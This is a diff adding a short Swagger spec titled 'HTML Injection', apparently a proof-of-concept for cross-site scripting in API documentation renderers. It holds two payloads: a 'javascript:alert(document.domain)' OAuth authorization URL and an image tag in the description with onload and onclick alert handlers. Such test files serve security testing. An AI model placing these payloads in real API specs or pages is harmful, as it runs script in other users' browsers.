@@ -1,0 +1,15 @@
+swagger: "3.0"
+securityDefinitions:
+  oauth:
+    type: oauth2
+    authorizationUrl: javascript:alert(document.domain)//
+info:
+  version: "0.0.1"
+  title: HTML Injection
+  description: <img src=https://media.istockphoto.com/id/1144604245/es/foto/un-sistema-inform%C3%A1tico-de-advertencia-hackeado.jpg?s=612x612&w=is&k=20&c=xonEnGopTt3E37x0pEK_A0whee_d5SpOyzOEGaXdS5M= onload="alert(1)" onclick="alert(1)"> 
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful response
